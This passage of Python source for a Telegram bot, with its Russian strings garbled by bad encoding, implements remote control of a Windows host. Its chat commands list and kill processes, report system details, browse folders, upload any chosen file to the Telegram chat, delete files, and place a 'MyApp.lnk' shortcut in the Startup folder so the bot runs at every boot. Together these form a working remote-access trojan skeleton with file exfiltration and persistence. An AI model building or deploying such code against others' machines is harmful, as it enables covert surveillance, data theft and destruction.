        await message.reply(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}")


@dp.message_handler(commands=["kill"])
@restricted
async def kill_process_command(message: types.Message):
    try:
        # –ü–æ–ª—É—á–µ–Ω–∏–µ PID –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥—ã
        args = message.get_args()
        if not args.isdigit():
            await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π PID –ø—Ä–æ—Ü–µ—Å—Å–∞.")
            return

        pid = int(args)
        
        # –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞
        try:
            proc = psutil.Process(pid)
            proc.terminate()  # –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
            await message.reply(f"‚úÖ –ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} ({proc.name()}) —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à—ë–Ω.")
        except psutil.NoSuchProcess:
            await message.reply(f"‚ö†Ô∏è –ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        except psutil.AccessDenied:
            await message.reply(f"‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å PID {pid}.")
    except Exception as e:
        await message.reply(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")


@dp.message_handler(commands=["sysinfo"])
@restricted
async def system_info(message: types.Message):
    try:
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –û–°
        os_name = platform.system()
        os_version = platform.version()
        os_release = platform.release()
        os_architecture = platform.architecture()[0]

        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
        cpu_info = platform.processor()
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        cpu_usage = psutil.cpu_percent(interval=1)

        # –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å
        memory = psutil.virtual_memory()
        total_memory = round(memory.total / (1024 ** 3), 2)  # GB
        available_memory = round(memory.available / (1024 ** 3), 2)  # GB

        # –î–∏—Å–∫–∏
        disk_usage = psutil.disk_usage('/')
        total_disk = round(disk_usage.total / (1024 ** 3), 2)  # GB
        used_disk = round(disk_usage.used / (1024 ** 3), 2)  # GB
        free_disk = round(disk_usage.free / (1024 ** 3), 2)  # GB

        # –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã
        uptime_seconds = time.time() - psutil.boot_time()
        uptime = str(timedelta(seconds=int(uptime_seconds)))

        # –í–∏–¥–µ–æ–∫–∞—Ä—Ç—ã
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_info = "\n".join(
                [
                    f"   - {gpu.name} (–ó–∞–≥—Ä—É–∑–∫–∞: {gpu.load * 100:.1f}%, "
                    f"–ü–∞–º—è—Ç—å: {gpu.memoryFree:.1f}/{gpu.memoryTotal:.1f} MB, "
                    f"–¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞: {gpu.temperature}¬∞C)"
                    for gpu in gpus
                ]
            )
        else:
            gpu_info = "   - –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ"

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        info = (
            f"**–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**\n"
            f"üñ•Ô∏è **–û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞:** {os_name} {os_release} (–í–µ—Ä—Å–∏—è: {os_version}, –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: {os_architecture})\n"
            f"üîß **–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:** {cpu_info}\n"
            f"   - –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä: {cpu_count}\n"
            f"   - –ß–∞—Å—Ç–æ—Ç–∞: {cpu_freq.current:.2f} MHz\n"
            f"   - –ó–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç—å CPU: {cpu_usage}%\n"
            f"üíæ **–û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å:**\n"
            f"   - –í—Å–µ–≥–æ: {total_memory} GB\n"
            f"   - –î–æ—Å—Ç—É–ø–Ω–æ: {available_memory} GB\n"
            f"üíΩ **–î–∏—Å–∫:**\n"
            f"   - –í—Å–µ–≥–æ: {total_disk} GB\n"
            f"   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: {used_disk} GB\n"
            f"   - –°–≤–æ–±–æ–¥–Ω–æ: {free_disk} GB\n"
            f"üéÆ **–í–∏–¥–µ–æ–∞–¥–∞–ø—Ç–µ—Ä—ã:**\n{gpu_info}\n"
            f"‚è≥ **–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã:** {uptime}\n"
        )

        await message.reply(info, parse_mode="Markdown")
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {e}")


async def get_directory_listing(path):
    try:
        files = os.listdir(path)
        files = [f for f in files if not f.startswith('.')]  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Å–∫—Ä—ã—Ç—ã–µ —Ñ–∞–π–ª—ã
        return files
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ: {e}"

@dp.message_handler(commands=["ls"])
@restricted
async def ls_command(message: types.Message):
    global current_dir

    # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    files = await get_directory_listing(current_dir)
    if isinstance(files, str):  # –ï—Å–ª–∏ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞
        await message.reply(files)
        return
    
    # –°–æ–∑–¥–∞–µ–º —Å–ø–∏—Å–æ–∫ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
    file_list = []
    for i, file in enumerate(files):
        file_path = os.path.join(current_dir, file)
        if os.path.isdir(file_path):
            file_list.append(f"{i + 1}. üìÇ {file}")  # –î–æ–±–∞–≤–ª—è–µ–º –∏–∫–æ–Ω–∫—É –¥–ª—è –ø–∞–ø–æ–∫
        else:
            file_list.append(f"{i + 1}. {file}")  # –î–ª—è —Ñ–∞–π–ª–æ–≤ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
    await message.reply(f"–í—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤: {current_dir}:\n" + "\n".join(file_list))

@dp.message_handler(commands=["cd"])
@restricted
async def cd_command(message: types.Message):
    global current_dir

    # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä –ø–∞–ø–∫–∏ –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
    args = message.get_args()
    if args.isdigit():
        folder_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if folder_number < len(files):
            folder = files[folder_number]
            folder_path = os.path.join(current_dir, folder)
            if os.path.isdir(folder_path):  # –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ —ç—Ç–æ –ø–∞–ø–∫–∞
                current_dir = folder_path
                await message.reply(f"–í—ã –ø–µ—Ä–µ–º–µ—Å—Ç–∏–ª–∏—Å—å –≤: {current_dir}")
            else:
                await message.reply("–í—ã–±—Ä–∞–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –ø–∞–ø–∫–æ–π.")
        else:
            await message.reply("–ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –ø–∞–ø–∫–∏.")
    else:
        # –ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω–æ –∏–º—è –¥–µ—Ñ–æ–ª—Ç–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
        if args.lower() in default_dirs:
            current_dir = default_dirs[args.lower()]
            await message.reply(f"–í—ã –ø–µ—Ä–µ–º–µ—Å—Ç–∏–ª–∏—Å—å –≤: {current_dir}")
        else:
            await message.reply("–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏.")

@dp.message_handler(commands=["load"])
@restricted
async def load_command(message: types.Message):
    global current_dir

    # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
    args = message.get_args()
    if args.isdigit():
        file_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if file_number < len(files):
            file_name = files[file_number]
            file_path = os.path.join(current_dir, file_name)
            if os.path.isfile(file_path):  # –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ —ç—Ç–æ —Ñ–∞–π–ª
                await message.reply(f"–ó–∞–≥—Ä—É–∂–∞—é —Ñ–∞–π–ª: {file_name}")
                await bot.send_document(message.chat.id, InputFile(file_path))
            else:
                await message.reply("–í—ã–±—Ä–∞–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ñ–∞–π–ª–æ–º.")
        else:
            await message.reply("–ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞.")
    else:
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏.")


@dp.message_handler(commands=["rm"])
@restricted
async def rm_command(message: types.Message):
    global current_dir

    # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞ –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è
    args = message.get_args()
    if args.isdigit():
        file_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if file_number < len(files):
            target_name = files[file_number]
            target_path = os.path.join(current_dir, target_name)
            try:
                if os.path.isdir(target_path):
                    os.rmdir(target_path)  # –£–¥–∞–ª—è–µ–º –ø—É—Å—Ç—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
                    await message.reply(f"–ü–∞–ø–∫–∞ '{target_name}' —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞.")
                elif os.path.isfile(target_path):
                    os.remove(target_path)  # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª
                    await message.reply(f"–§–∞–π–ª '{target_name}' —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω.")
                else:
                    await message.reply("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Ç–∏–ø —ç–ª–µ–º–µ–Ω—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")
            except Exception as e:
                await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏: {e}")
        else:
            await message.reply("–ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞ –∏–ª–∏ –ø–∞–ø–∫–∏.")
    else:
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä —Ñ–∞–π–ª–∞ –∏–ª–∏ –ø–∞–ø–∫–∏ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")


def add_to_startup():
    """–î–æ–±–∞–≤–ª—è–µ—Ç —Ç–µ–∫—É—â–∏–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –≤ –ø–∞–ø–∫—É –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏."""
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    exe_path = sys.executable  # –ü—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É

    shortcut_name = "MyApp.lnk"  # –ò–º—è —è—Ä–ª—ã–∫–∞
    shortcut_path = os.path.join(startup_folder, shortcut_name)

    try:
        if not os.path.exists(shortcut_path):
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.Save()
            return "–ü—Ä–æ–≥—Ä–∞–º–º–∞ —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É!"
        else:
            return "–Ø—Ä–ª—ã–∫ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ –ø–∞–ø–∫–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏."
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É: {e}"


@dp.message_handler(commands=['startup'])
@restricted
async def startup_command(message: types.Message):
    result = add_to_startup()
    await message.reply(result)



if __name__ == "__main__":
    async def main():
        await dp.start_polling()

    asyncio.run(main())